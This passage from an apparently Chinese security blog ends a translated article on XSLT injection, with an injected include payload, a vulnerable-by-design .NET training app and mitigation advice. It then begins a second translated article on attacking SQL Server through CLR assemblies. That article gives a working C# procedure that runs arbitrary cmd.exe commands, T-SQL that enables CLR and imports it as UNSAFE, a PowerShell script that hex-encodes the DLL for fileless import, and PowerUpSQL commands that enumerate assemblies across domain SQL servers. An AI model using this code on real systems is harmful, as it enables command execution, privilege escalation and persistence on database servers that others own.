<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"a"</span>&gt;</span></div></pre></td></tr></table></figure>
<p>在注入后，生成的XSLT文档看起来是这样的：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">"1.0"</span> <span class="attr">xmlns:xsl</span>=<span class="string">"http://www.w3.org/1999/XSL/Transform"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">"/fruits"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span><span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span><span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">name</span>=<span class="string">"a"</span>&gt;</span></div><div class="line">    Fruits:</div><div class="line">    <span class="comment">&lt;!-- Loop for each fruit --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">xsl:for-each</span> <span class="attr">select</span>=<span class="string">"fruit"</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!-- Print name: description --&gt;</span></div><div class="line">      - <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"name"</span>/&gt;</span>: <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">"description"</span>/&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">xsl:for-each</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">xsl:include</span> <span class="attr">href</span>=<span class="string">"external_transform.xslt"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></div></pre></td></tr></table></figure>
<p>转换后将生成如下输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hello from the external transformation</div></pre></td></tr></table></figure>
<p>和XXE、document()函数一样，import和include标签可以用来数据窃取和基本的端口扫描。</p>
<h2 id="XSLT—-导致app易受攻击"><a href="#XSLT—-导致app易受攻击" class="headerlink" title="XSLT—-导致app易受攻击"></a>XSLT—-导致app易受攻击</h2><p>在识别出XSLT漏洞后，编写能工作的exp是比较棘手的。</p>
<p>这有一部分是因为xml严格的语法要求，另一部分是因为应用程序的实现细节。</p>
<p>测试</p>
<p>所以我写了一个小型易受攻击的.Net控制台应用程序，可用于测试前面所提到的攻击。该应用是由.Net’s System.Xml 实现的。带有注释的完整代码报告如下，可以通过Microsoft Visual Studio来编译。代码和已经编译好的应用可以在这里<a href="https://github.com/ctxis/VulnerableXsltConsoleApplication" target="_blank" rel="external">下载</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Xml;</div><div class="line">using System.Xml.Xsl;</div><div class="line"></div><div class="line">namespace XsltConsoleApplication</div><div class="line">&#123;</div><div class="line">    class Program</div><div class="line">    &#123;</div><div class="line">        /*</div><div class="line">        This code contains serious vulnerabilities and is provided for training purposes only!</div><div class="line">        DO NOT USE ANYWHERE FOR ANYTHING ELSE!!!</div><div class="line">        */</div><div class="line">        static void Main(string[] args)</div><div class="line">        &#123;</div><div class="line">            Console.WriteLine(&quot;\n#####################################################################&quot;);</div><div class="line">            Console.WriteLine(&quot;#                                                                   #&quot;);</div><div class="line">            Console.WriteLine(&quot;# This is a Vulnerable-by-Design application to test XSLT Injection #&quot;);</div><div class="line">            Console.WriteLine(&quot;#                                                                   #&quot;);</div><div class="line">            Console.WriteLine(&quot;#####################################################################\n&quot;);</div><div class="line">            Console.WriteLine(&quot;The application expects (in the current working directory):&quot;);</div><div class="line">            Console.WriteLine(&quot; - an XML file (data.xml) and\n - an XSLT style sheet (transform.xslt)\n&quot;);</div><div class="line">            Console.WriteLine(&quot;===================================================================&quot;);</div><div class="line"></div><div class="line">            String transformationXsltFileURI = &quot;transform.xslt&quot;;</div><div class="line">            String dataXMLFileURI = &quot;data.xml&quot;;</div><div class="line"></div><div class="line">            // Enable DTD processing to load external XML entities for both the XML and XSLT file</div><div class="line">            XmlReaderSettings vulnerableXmlReaderSettings = new XmlReaderSettings();</div><div class="line">            vulnerableXmlReaderSettings.DtdProcessing = DtdProcessing.Parse;</div><div class="line">            vulnerableXmlReaderSettings.XmlResolver = new XmlUrlResolver();</div><div class="line">            XmlReader vulnerableXsltReader = XmlReader.Create(transformationXsltFileURI, vulnerableXmlReaderSettings);</div><div class="line">            XmlReader vulnerableXmlReader = XmlReader.Create(dataXMLFileURI, vulnerableXmlReaderSettings);</div><div class="line"></div><div class="line">            XsltSettings vulnerableSettings = new XsltSettings();</div><div class="line">            // Embedded script blocks and the document() function are NOT enabled by default</div><div class="line">            vulnerableSettings.EnableDocumentFunction = true;</div><div class="line">            vulnerableSettings.EnableScript = true;</div><div class="line">            // A vulnerable settings class can also be created with:</div><div class="line">            // vulnerableSettings = XsltSettings.TrustedXslt;</div><div class="line"></div><div class="line">            XslCompiledTransform vulnerableTransformation = new XslCompiledTransform();</div><div class="line">            // XmlUrlResolver is the default resolver for XML and XSLT and supports the file: and http: protocols</div><div class="line">            XmlUrlResolver vulnerableResolver = new XmlUrlResolver();</div><div class="line">            vulnerableTransformation.Load(vulnerableXsltReader, vulnerableSettings, vulnerableResolver);  </div><div class="line"></div><div class="line">            XmlWriter output = new XmlTextWriter(Console.Out);</div><div class="line"></div><div class="line">            // Run the transformation</div><div class="line">            vulnerableTransformation.Transform(vulnerableXmlReader, output);   </div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>该应用需要data.xml和transformation.xslt文件在当前工作目录下。</p>
<h2 id="推荐"><a href="#推荐" class="headerlink" title="推荐"></a>推荐</h2><p>如果你的应用使用了XSLT，通过下列引导你可以降低风险：</p>
<ul>
<li>尽可能避免使用用户提供的XSLT文档</li>
<li>不要使用不受信任的输入去生成XSLT文档，比如拼接字符串。如果需要非静态值，则应将其包含在XML数据文件中，并且仅由XSLT文档引用</li>
<li>明确禁止使用XSLT库实现的危险功能。查阅库的文档如何禁用XML外部实体、document()函数、import和include标签。确保嵌入脚本扩展是禁用的，同时其他允许读或写外部文件的专用扩展也被禁用了。</li>
</ul>
<p>Emanuel Duss和Roland Bischofberger写了一份文档，讲述了流行的XSLT库实现的功能和他们的默认配置。文档的34页包含了一张便捷比较表格，可以作为入手点。<a href="https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf." target="_blank" rel="external">点我下载PDF</a></p>
<h2 id="总结和结论"><a href="#总结和结论" class="headerlink" title="总结和结论"></a>总结和结论</h2><p>XSLT是非常有用的工具，许多应用都用了，但它的问题并不那么为人所知。差的代码实践会引入漏洞，这可能会导致应用控制权的完全丧失和数据被窃取。本文致力于提高大家的意识，通过展示一些可能的攻击手法和引导建议来避免常见的实现上的问题。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="/2017-09-14-attack-sql-server-clr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Ꭰ">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017-09-14-attack-sql-server-clr/" itemprop="url">【译】攻击SQL Server的CLR库</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-09-14T12:16:27+08:00">
                2017-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Translation/" itemprop="url" rel="index">
                    <span itemprop="name">Translation</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文中，我将以Nathan Krik的CLR系列文章提到的<a href="https://en.wikipedia.org/wiki/SQL_CLR" target="_blank" rel="external">CLR</a><a href="https://en.wikipedia.org/wiki/Assembly_(CLI" target="_blank" rel="external">assembly</a>)为基础进行拓展。同时我也会介绍如何创建、导入、导出以及修改SQL Server的CRL库去实现提权、命令执行以及持久化操作。</p>
<p>先让我们来对要介绍的内容进行一个略览。你也可以跳过这部分内容：</p>
<ul>
<li>CLR assembly是什么？</li>
<li>为SQL Server定制化CLR</li>
<li>将CLR DLL文件转为16进制并导入（不需要通过文件）</li>
<li>列出CLR的存储过程</li>
<li>将存在的CLR assembly导出为dll</li>
<li>修改导出的CLR DLL文件与在SQL Server中对存在的CLR Assembly进行修改</li>
<li>通过定制化的CLR进行提权</li>
</ul>
<h2 id="什么是CLR-assembly"><a href="#什么是CLR-assembly" class="headerlink" title="什么是CLR assembly"></a>什么是CLR assembly</h2><p>为了能够达到本片博客的目的，我们将<a href="https://docs.microsoft.com/en-us/dotnet/standard/clr" target="_blank" rel="external">Common Language Runtime</a>(CLR) assembly定义为.Net DLL（也可理解为一组DLL文件），这些文件均能导入至SQL Server。成功导入后，DLL的方法会被链接到存储过程，并通过TSQL执行。尽管创建和导入自定义CLR assembly是开发人员扩展SQL Server的内置函数的好方法，但这也为攻击者制造了机会。</p>
<h2 id="如何为SQL-Server定制化CLR-DLL"><a href="#如何为SQL-Server定制化CLR-DLL" class="headerlink" title="如何为SQL Server定制化CLR DLL"></a>如何为SQL Server定制化CLR DLL</h2><p>接下来的这段C#模版功能是执行操作系统命令，它是建立在Nathan Kirik的工作成果和一些极棒的<a href="https://msdn.microsoft.com/en-us/library/ms131094.aspx" target="_blank" rel="external">微软文章</a>上。当然，你可以在此基础上进行修改，如果修改完了，记得另存为”C:\temp\cmd_exec.cs”。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Data;</div><div class="line">using System.Data.SqlClient;</div><div class="line">using System.Data.SqlTypes;</div><div class="line">using Microsoft.SqlServer.Server;</div><div class="line">using System.IO;</div><div class="line">using System.Diagnostics;</div><div class="line">using System.Text;</div><div class="line"></div><div class="line">public partial class StoredProcedures</div><div class="line">&#123;</div><div class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</div><div class="line">    public static void cmd_exec (SqlString execCommand)</div><div class="line">    &#123;</div><div class="line">        Process proc = new Process();</div><div class="line">        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;</div><div class="line">        proc.StartInfo.Arguments = string.Format(@&quot; /C &#123;0&#125;&quot;, execCommand.Value);</div><div class="line">        proc.StartInfo.UseShellExecute = false;</div><div class="line">        proc.StartInfo.RedirectStandardOutput = true;</div><div class="line">        proc.Start();</div><div class="line"></div><div class="line">        // Create the record and specify the metadata for the columns.</div><div class="line">        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));</div><div class="line">        </div><div class="line">        // Mark the beginning of the result set.</div><div class="line">        SqlContext.Pipe.SendResultsStart(record);</div><div class="line"></div><div class="line">        // Set values for each column in the row</div><div class="line">        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());</div><div class="line"></div><div class="line">        // Send the row back to the client.</div><div class="line">        SqlContext.Pipe.SendResultsRow(record);</div><div class="line">        </div><div class="line">        // Mark the end of the result set.</div><div class="line">        SqlContext.Pipe.SendResultsEnd();</div><div class="line">        </div><div class="line">        proc.WaitForExit();</div><div class="line">        proc.Close();</div><div class="line">    &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>现在咱们的目标是通过csc.exe对”C:\temp\cmd_exec.cs”进行编译。即使你没有安装Visual Studio也不用担心，因为.NET框架默认是携带了csc.exe。所以，问题只是这个软件藏在你操作系统的某处。你可以通过下面这段PowerShell命令找到它哦。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">Get-ChildItem</span> -Recurse <span class="string">"C:\Windows\Microsoft.NET\"</span> -Filter <span class="string">"csc.exe"</span> | <span class="built_in">Sort-Object</span> fullname -Descending | <span class="built_in">Select-Object</span> fullname -First <span class="number">1</span> -ExpandProperty fullname</div></pre></td></tr></table></figure>
<p>假设你已经找到了csc.exe，接着你可以通过下面这样的命令对 “c:\temp\cmd_exec.cs” 进行编译。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</div></pre></td></tr></table></figure>
<h2 id="如何导入将CLR-DLL导入到SQL-Server"><a href="#如何导入将CLR-DLL导入到SQL-Server" class="headerlink" title="如何导入将CLR DLL导入到SQL Server"></a>如何导入将CLR DLL导入到SQL Server</h2><p>为了将刚生成的dll导入Sql Server，你必须以sysadmin权限登录，同时还需要CREATE ASSEMBLY的权限或者是ALTER ASSEMBLY权限。按照下面的步骤来操作的话能够成功注入DLL并将其与存储过程链接在一起，这么一来的话就可以通过TSQL来执行cmd_exec函数了。</p>
<p>首先以sysadmin登录SQL Server接着进行下面的查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">-- Select the msdb database</div><div class="line">use msdb</div><div class="line"></div><div class="line">-- Enable show advanced options on the server</div><div class="line">sp_configure &apos;show advanced options&apos;,1</div><div class="line">RECONFIGURE</div><div class="line">GO</div><div class="line">-- Enable clr on the server</div><div class="line">sp_configure &apos;clr enabled&apos;,1</div><div class="line">RECONFIGURE</div><div class="line">GO</div><div class="line"></div><div class="line">-- Import the assembly</div><div class="line">CREATE ASSEMBLY my_assembly</div><div class="line">FROM &apos;c:\temp\cmd_exec.dll&apos;</div><div class="line">WITH PERMISSION_SET = UNSAFE;</div><div class="line"></div><div class="line">-- Link the assembly to a stored procedure</div><div class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];</div><div class="line">GO</div></pre></td></tr></table></figure>
<p>现在你应该可以通过”msdb”中”cmd_exec”存储过程执行操作系统命令了，效果如下：</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/1.png" alt="1"></p>
<p>当你完成了这一步，你便可以通过下面的命令删除存储过程和assembly。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DROP PROCEDURE cmd_exec</div><div class="line">DROP ASSEMBLY my_assembly</div></pre></td></tr></table></figure>
<h2 id="如何将CLR-DLL转为十六进制字符串，而后不通过文件导出呢？"><a href="#如何将CLR-DLL转为十六进制字符串，而后不通过文件导出呢？" class="headerlink" title="如何将CLR DLL转为十六进制字符串，而后不通过文件导出呢？"></a>如何将CLR DLL转为十六进制字符串，而后不通过文件导出呢？</h2><p>如果你阅读过Nathan Kirk’s的<a href="http://sekirkity.com/requested-command-execution-with-sqli-via-seeclrly/" target="_blank" rel="external">系列博客</a>，那你一定知道在将CLR assemblies导入到SQL Server时不必引用物理上的DLL。”CREATE ASSEMBLY”会接受十六进制形式的CLR DLL文件。下面的PowerShell脚本例子会向你展示如何将’cmd_exec.dll’文件转化为TSQL命令，该命令不经过物理文件的引用就可用来创建assembly。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Target file</span></div><div class="line"><span class="variable">$assemblyFile</span> = <span class="string">"c:\temp\cmd_exec.dll"</span></div><div class="line"></div><div class="line"><span class="comment"># Build top of TSQL CREATE ASSEMBLY statement</span></div><div class="line"><span class="variable">$stringBuilder</span> = <span class="built_in">New-Object</span> -Type System.Text.StringBuilder </div><div class="line"><span class="variable">$stringBuilder</span>.Append(<span class="string">"CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x"</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Read bytes from file</span></div><div class="line"><span class="variable">$fileStream</span> = [IO.File]::OpenRead(<span class="variable">$assemblyFile</span>)</div><div class="line"><span class="keyword">while</span> ((<span class="variable">$byte</span> = <span class="variable">$fileStream</span>.ReadByte()) <span class="nomarkup">-gt</span> -<span class="number">1</span>) &#123;</div><div class="line">    <span class="variable">$stringBuilder</span>.Append(<span class="variable">$byte</span>.ToString(<span class="string">"X2"</span>)) | <span class="built_in">Out-Null</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment"># Build bottom of TSQL CREATE ASSEMBLY statement</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"`nWITH PERMISSION_SET = UNSAFE"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"GO"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">" "</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Build create procedure command</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"GO"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">" "</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Create run os command</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"EXEC[dbo].[cmd_exec] 'whoami'"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">"GO"</span>) | <span class="built_in">Out-Null</span></div><div class="line"><span class="variable">$stringBuilder</span>.AppendLine(<span class="string">" "</span>) | <span class="built_in">Out-Null</span></div><div class="line"></div><div class="line"><span class="comment"># Create file containing all commands</span></div><div class="line"><span class="variable">$stringBuilder</span>.ToString() -join <span class="string">""</span> | <span class="built_in">Out-File</span> c:\temp\cmd_exec.txt</div></pre></td></tr></table></figure>
<p>如果这一切都进行得很顺利，文件”c:\temp\cmd_exec.txt”会包含下面的TSQL命令。以文中的为例，你可以看到十六进制字符被截断了，但是你自己的那块应该更长点。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">-- Select the MSDB database</div><div class="line">USE msdb</div><div class="line"></div><div class="line">-- Enable clr on the server</div><div class="line">Sp_Configure &apos;clr enabled&apos;, 1</div><div class="line">RECONFIGURE</div><div class="line">GO</div><div class="line"></div><div class="line">-- Create assembly from ascii hex</div><div class="line">CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM </div><div class="line">0x4D5A90000300000004000000F[TRUNCATED]</div><div class="line">WITH PERMISSION_SET = UNSAFE </div><div class="line">GO </div><div class="line"></div><div class="line">-- Create procedures from the assembly method cmd_exec</div><div class="line">CREATE PROCEDURE [dbo].[my_assembly] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec]; </div><div class="line">GO </div><div class="line"></div><div class="line">-- Run an OS command as the SQL Server service account</div><div class="line">EXEC[dbo].[cmd_exec] &apos;whoami&apos; </div><div class="line">GO</div></pre></td></tr></table></figure>
<p>当你在Sql Server中以sysadmin权限运行来自”c:\temp\cmd_exec.txt”的TSQL命令时，输出结果看起来应该和下面的差不多。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/2.png" alt="2"></p>
<h4 id="利用PowerUpSQL自动化"><a href="#利用PowerUpSQL自动化" class="headerlink" title="利用PowerUpSQL自动化"></a>利用PowerUpSQL自动化</h4><p>如果你从未使用过PowerUpSQL，你可以在<a href="https://github.com/NetSPI/PowerUpSQL/wiki" target="_blank" rel="external">这</a>找到安装说明。</p>
<p>我写了个PowerUpSQL函数，名为Create-SQLFileCLRDLL，这可以用来加快创建类似的DLLs和TSQL脚本。该函数有一些可选参数，用来定制assembly名、类名、方法名以及存储过程名。如果不指定参数的话，这些名字都会随机的。下面是一个基本的命令例子：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">PS C:\temp&gt; Create-SQLFileCLRDll -ProcedureName <span class="string">"runcmd"</span> -OutFile runcmd -OutDir c:\temp</div><div class="line">C<span class="comment"># File: c:\temp\runcmd.csc</span></div><div class="line">CLR DLL: c:\temp\runcmd.dll</div><div class="line">SQL Cmd: c:\temp\runcmd.txt</div></pre></td></tr></table></figure>
<p>下面的这行简短的代码时用来生成10个样本（CLR DLLS/CREATE ASSEMBLY TSQL脚本）。这对于在实验室尝试CLR assemblies来说会非常方便。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>..<span class="number">10</span>| %&#123; Create-SQLFileCLRDll -Verbose -ProcedureName myfile<span class="variable">$_</span> -OutDir c:\temp -OutFile myfile<span class="variable">$_</span> &#125;</div></pre></td></tr></table></figure>
<h2 id="我是如何列出存在的CLR-Asssemblies和CLR存储过程的呢？"><a href="#我是如何列出存在的CLR-Asssemblies和CLR存储过程的呢？" class="headerlink" title="我是如何列出存在的CLR Asssemblies和CLR存储过程的呢？"></a>我是如何列出存在的CLR Asssemblies和CLR存储过程的呢？</h2><p>你可以使用下面这条TSQL查询去验证你的CLR assembly是否安装正确，或用来寻找已经存在的用户定义的CLR assemblies。</p>
<p>注意：这个版本的代码是被我修改过的，<a href="https://stackoverflow.com/questions/3155542/sql-server-how-to-list-all-clr-functions-procedures-objects-for-assembly" target="_blank" rel="external">原版在这</a>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">USE msdb;</div><div class="line">SELECT      SCHEMA_NAME(so.[schema_id]) AS [schema_name], </div><div class="line">            af.file_id,					  	</div><div class="line">            af.name + &apos;.dll&apos; as [file_name],</div><div class="line">            asmbly.clr_name,</div><div class="line">            asmbly.assembly_id,           </div><div class="line">            asmbly.name AS [assembly_name], </div><div class="line">            am.assembly_class,</div><div class="line">            am.assembly_method,</div><div class="line">            so.object_id as [sp_object_id],</div><div class="line">            so.name AS [sp_name],</div><div class="line">            so.[type] as [sp_type],</div><div class="line">            asmbly.permission_set_desc,</div><div class="line">            asmbly.create_date,</div><div class="line">            asmbly.modify_date,</div><div class="line">            af.content								           </div><div class="line">FROM        sys.assembly_modules am</div><div class="line">INNER JOIN  sys.assemblies asmbly</div><div class="line">ON  	    asmbly.assembly_id = am.assembly_id</div><div class="line">INNER JOIN  sys.assembly_files af </div><div class="line">ON 	    asmbly.assembly_id = af.assembly_id </div><div class="line">INNER JOIN  sys.objects so</div><div class="line">ON  	    so.[object_id] = am.[object_id]</div></pre></td></tr></table></figure>
<p>通过这条查询，我们能够看到文件名、assembly 名，assembly类名，assembly方法以及方法对应的存储过程。</p>
<p><img src="/2017-09-14-attack-sql-server-clr/attack_sql_server_clr/3.png" alt="3"></p>
<p>这个时候你应该能看到出现在你眼前的结果中是包含了”my_assembly”的。如果你通过我前面所提到的”Create-SQLFileCLRDll”命令执行了10次TSQL查询，你也能看到与assembly对应的信息。</p>
<h4 id="利用PowerUpSQL自动化-1"><a href="#利用PowerUpSQL自动化-1" class="headerlink" title="利用PowerUpSQL自动化"></a>利用PowerUpSQL自动化</h4><p>为了完成上面这个过程，我在PowerUpSQL中添加了一个名为”Get-SQLStoredProcedureCLR”的函数，该函数会自动迭代整个数据库并为每个assembly提供一一对应的信息。下面是这条命令的示例。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Out-GridView</span></div></pre></td></tr></table></figure>
<p>你也在所有域SQL服务器上执行下面这条命令（前提是你得有足够的权限）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Get-SQLInstanceDomain -Verbose | Get-SQLStoredProcedureCLR -Verbose -Instance MSSQLSRV04\SQLSERVER2014 -Username sa -Password <span class="string">'sapassword!'</span> | <span class="built_in">Format-Table</span> -AutoSize</div></pre></td></tr></table></figure>
